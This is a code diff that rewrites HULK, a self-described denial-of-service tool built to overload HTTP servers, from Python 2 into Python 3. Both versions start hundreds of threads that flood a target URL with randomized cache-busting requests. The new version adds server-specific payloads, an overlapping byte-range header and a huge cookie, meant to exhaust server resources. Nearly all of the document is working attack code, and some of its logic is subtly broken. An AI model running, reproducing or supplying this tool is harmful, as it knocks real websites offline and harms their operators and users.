@@ -1,155 +1,120 @@
-# ----------------------------------------------------------------------------------------------
-# HULK - HTTP Unbearable Load King
-#
-# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
-# to their knees by exhausting the resource pool, its is meant for research purposes only
-# and any malicious usage of this tool is prohibited.
-#
-# author :  Barry Shteiman , version 1.0
-# ----------------------------------------------------------------------------------------------
-import urllib2
-import sys
+#!/usr/bin/env python
+
+"""THE UNBEARABLE LOAD KING
+Usage:
+  hulk.py <site> [--thread=<t>] [--quiet]
+  hulk.py (-h | --help)
+  hulk.py --version
+
+Options:
+  -h --help         Show this screen.
+  --version         Show version.
+  -q --quiet        Omit banner
+  -t --thread=<t>   Number of threads to use [default: 500]
+"""
+## imports
+from docopt import docopt
+from load import doser
 import threading
 import random
-import re
+import string
+import sys
+from functools import partial
+from banner import asciiart
 
-#global params
-url=''
-host=''
-headers_useragents=[]
-headers_referers=[]
-request_counter=0
-flag=0
-safe=0
+## Generating random strings
+def asciigen(size):
+    result_str = ''.join(random.choice(string.ascii_uppercase) for i in range(size))
+    return result_str
 
-def inc_counter():
-	global request_counter
-	request_counter+=1
+## Generate payload
+def generate_payload():
+    if httpcall.ping.headers['server'] == 'Apache':
+        return [hex(x) for x in range(0,pow(2, 16))]
+    else:
+        return "bytes=0-,%s" % ",".join("5-%d" % item for item in range(1, 1024))
 
-def set_flag(val):
-	global flag
-	flag=val
+##Generate headers
+def generate_headers(host):
+    payload = "".join(generate_payload())
+    if httpcall.ping.headers['server'] == 'Apache':
+        headers = { 'Host': host, 'Cookie': payload, 'Accept-Encoding': 'gzip, deflate, br'}
+        return headers
+    else:
+        headers = { 'Host': host, 'Range': payload, 'Accept-Encoding': 'gzip, deflate' }
+        return headers
 
-def set_safe():
-	global safe
-	safe=1
-	
-# generates a user agent array
-def useragent_list():
-	global headers_useragents
-	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-	return(headers_useragents)
+## sending requests to the site to get what method it uses
+def httpcall(DOS, url):
 
-# generates a referer array
-def referer_list():
-	global headers_referers
-	headers_referers.append('http://www.google.com/?q=')
-	headers_referers.append('http://www.usatoday.com/search/results?q=')
-	headers_referers.append('http://engadget.search.aol.com/search?q=')
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
-	
-#builds random ascii string
-def buildblock(size):
-	out_str = ''
-	for i in range(0, size):
-		a = random.randint(65, 90)
-		out_str += chr(a)
-	return(out_str)
+    httpcall.param_joiner = '&' if '?' in url else "?"
 
-def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python hulk.py <url>'
-	print 'you can add "safe" after url, to autoshut after dos'
-	print '---------------------------------------------------'
+    try:
+        httpcall.ping = DOS.get(url)
 
-	
-#http request
-def httpcall(url):
-	useragent_list()
-	referer_list()
-	code=0
-	if url.count("?")>0:
-		param_joiner="&"
-	else:
-		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
-	request.add_header('User-Agent', random.choice(headers_useragents))
-	request.add_header('Cache-Control', 'no-cache')
-	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
-	request.add_header('Connection', 'keep-alive')
-	request.add_header('Host',host)
-	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
-			#print e.code
-			set_flag(1)
-			print 'Response Code 500'
-			code=500
-	except urllib2.URLError, e:
-			#print e.reason
-			sys.exit()
-	else:
-			inc_counter()
-			urllib2.urlopen(request)
-	return(code)		
+        return httpcall.ping.status_code
 
-	
-#http caller thread 
-class HTTPThread(threading.Thread):
-	def run(self):
-		try:
-			while flag<2:
-				code=httpcall(url)
-				if (code==500) & (safe==1):
-					set_flag(2)
-		except Exception, ex:
-			pass
+    except Exception as e:
+        print(e)
 
-# monitors http threads and counts requests
-class MonitorThread(threading.Thread):
-	def run(self):
-		previous=request_counter
-		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
-				previous=request_counter
-		if flag==2:
-			print "\n-- HULK Attack Finished --"
+##Calling the method
+def method(DOS, url):
+    code = httpcall(DOS, url)
+    if code == 405:
+        try:
+            send = DOS.post(url , data="etc")
+            print(f"========\nResponse code from the website :{send.status_code}\n==========")
+        except:
+            print("Site not accepting requests")
+            sys.exit()
+    elif httpcall.ping.headers['server'] == 'Apache':
+        try:
+            send = DOS.get(url , data=generate_headers(url.replace('https' or 'http', '')))
+            print(f"========\nResponse code from the website :{send.status_code}\n==========")
+        except Exception as e:
+            print(e)
+    elif httpcall.ping.headers['server'] == 'Microsoft-IIS/10':
+        try:
+            send = DOS.get(url , data=generate_headers(url.replace('https' or 'http', '')))
+            print(f"========\nResponse code from the website :{send.status_code}\n==========")
+        except Exception as e:
+            print(e)
+    else:
+        try:
+            send = DOS.get(url+ httpcall.param_joiner + asciigen(random.randint(3,10)) + '=' + asciigen(random.randint(3,10)))
+            print(f"========\nResponse code from the website :{send.status_code}\n==========")
+        except Exception as e:
+            print(e)
+            sys.exit()
 
-#execute 
-if len(sys.argv) < 2:
-	usage()
-	sys.exit()
-else:
-	if sys.argv[1]=="help":
-		usage()
-		sys.exit()
-	else:
-		print "-- HULK Attack Started --"
-		if len(sys.argv)== 3:
-			if sys.argv[2]=="safe":
-				set_safe()
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('(https?\://)?([^/]*)/?.*', url)
-		host = m.group(2)
-		for i in range(500):
-			t = HTTPThread()
-			t.start()
-		t = MonitorThread()
-		t.start()
+def dos(DOS, url, repeat):
+
+    try:
+        for i in range(repeat):
+            method(DOS, url)
+    except:
+        pass
+
+def main(site, thread_count, quiet):
+    if not quiet:
+        asciiart()
+
+    dos_func = partial(dos, doser(), site, 500)
+    threads = []
+    for _ in range(thread_count):
+        threads.append(threading.Thread(target=dos_func, daemon=True))
+        threads[-1].start()
+
+    try:
+        for thread in threads:
+            thread.join()
+    except KeyboardInterrupt:
+        print("Stoping...")
+
+if __name__ == "__main__":
+    args = docopt(__doc__, version='1.0.2')
+
+    main(args["<site>"],
+        int(args["--thread"]),
+        args["--quiet"])
+
